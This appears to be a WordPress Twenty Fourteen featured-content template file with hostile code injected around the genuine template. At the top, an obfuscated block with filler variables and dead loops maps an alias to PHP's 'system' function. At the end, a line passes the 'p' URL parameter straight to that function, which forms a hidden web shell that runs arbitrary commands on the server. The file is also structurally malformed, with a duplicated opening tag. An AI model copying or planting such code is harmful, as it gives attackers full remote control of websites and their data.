<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * The template for displaying featured content
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */

?>

<div id="featured-content" class="featured-content">
	<div class="featured-content-inner">
	<?php
		/**
		 * Fires before the Twenty Fourteen featured content.
		 *
		 * @since Twenty Fourteen 1.0
		 */
		do_action( 'twentyfourteen_featured_posts_before' );

		$featured_posts = twentyfourteen_get_featured_posts();
	foreach ( (array) $featured_posts as $order => $post ) :
		setup_postdata( $post );

		// Include the featured content template.
		get_template_part( 'content', 'featured-post' );
		endforeach;

		/**
		 * Fires after the Twenty Fourteen featured content.
		 *
		 * @since Twenty Fourteen 1.0
		 */
		do_action( 'twentyfourteen_featured_posts_after' );

		wp_reset_postdata();
	?>
	</div><!-- .featured-content-inner -->
</div><!-- #featured-content .featured-content -->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>